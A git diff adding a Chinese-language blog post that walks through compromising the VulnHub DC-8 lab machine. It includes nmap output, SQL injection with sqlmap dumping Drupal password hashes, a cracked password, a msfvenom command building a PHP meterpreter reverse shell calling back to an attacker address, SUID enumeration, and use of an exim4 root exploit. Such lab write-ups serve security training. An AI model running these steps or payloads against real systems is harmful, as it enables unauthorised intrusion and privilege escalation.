@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>vulnhub靶机渗透-DC-8</title>
+      <link href="/posts/24a0544e/"/>
+      <url>/posts/24a0544e/</url>
+      
+        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap扫描结果</p><pre><code>PORT   STATE SERVICE  VERSION22/tcp open  ssh      OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)| ssh-hostkey: |   2048 35:a7:e6:c4:a8:3c:63:1d:e1:c0:ca:a3:66:bc:88:bf (RSA)|   256 ab:ef:9f:69:ac:ea:54:c6:8c:61:55:49:0a:e7:aa:d9 (ECDSA)|_  256 7a:b2:c6:87:ec:93:76:d4:ea:59:4b:1b:c6:e8:73:f2 (ED25519)80/tcp open  ssl/http Apache|_http-generator: Drupal 7 (http://drupal.org)| http-robots.txt: 36 disallowed entries (15 shown)| /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt|_http-server-header: Apache|_http-title: Welcome to DC-8 | DC-8MAC Address: 08:00:27:A8:B6:73 (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><p>打开80端口发现是drupal,扫描到后台 <a href="http://192.168.56.102/user" target="_blank" rel="noopener">http://192.168.56.102/user</a> ，并且发现了可疑注入点</p><p><img src="/posts/24a0544e/1583216887452.png" alt></p><p>sqlmap注入</p><p><img src="/posts/24a0544e/1583217015158.png" alt></p><p>得到用户名和密码</p><pre><code>+-------+---------------------------------------------------------+| name  | pass                                                    |+-------+---------------------------------------------------------+| admin | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z || john  | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |+-------+---------------------------------------------------------+</code></pre><p>不过密码是hash过的，使用john爆破，只有 <code>john</code> 用户的密码可以爆破出来 <code>turtle</code></p><h2 id="后台getshell"><a href="#后台getshell" class="headerlink" title="后台getshell"></a>后台getshell</h2><p>修改页面</p><p><img src="/posts/24a0544e/1583217110935.png" alt></p><pre><code>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f raw  -o shell.php</code></pre><p>生成 shell ，修改</p><p><img src="/posts/24a0544e/1583217170125.png" alt></p><p>修改完之后，提交表单</p><p><img src="/posts/24a0544e/1583217222343.png" alt></p><p>成功getshell</p><p><img src="/posts/24a0544e/1583217261982.png" alt></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>寻找 SUID</p><pre><code>www-data@dc-8:/tmp$ find / -perm -u=s -type f 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null                     /usr/bin/chfn                                             /usr/bin/gpasswd                                          /usr/bin/chsh                                             /usr/bin/passwd                                           /usr/bin/sudo                                             /usr/bin/newgrp                                           /usr/sbin/exim4                                           /usr/lib/openssh/ssh-keysign                              /usr/lib/eject/dmcrypt-get-device                         /usr/lib/dbus-1.0/dbus-daemon-launch-helper               /bin/ping                                                 /bin/su                                                   /bin/umount                                               /bin/mount                                                </code></pre><p>发现了 <code>exim4</code> ,这是一个邮件程序</p><p>搜索相关的 exploit</p><p><img src="/posts/24a0544e/1583217430342.png" alt></p><p>将 <code>46996.sh</code> 上传到靶机上，注意需要修改一下文件格式为 <code>unix</code></p><pre><code>set ff=unix</code></pre><p><img src="/posts/24a0544e/1583217742979.png" alt></p><p>最后得到flag</p><p><img src="/posts/24a0544e/1583217755873.png" alt></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 靶机 </tag>
+            
+            <tag> vulnhub </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>HTB mango靶机实战</title>
       <link href="/posts/73230382/"/>
       <url>/posts/73230382/</url>
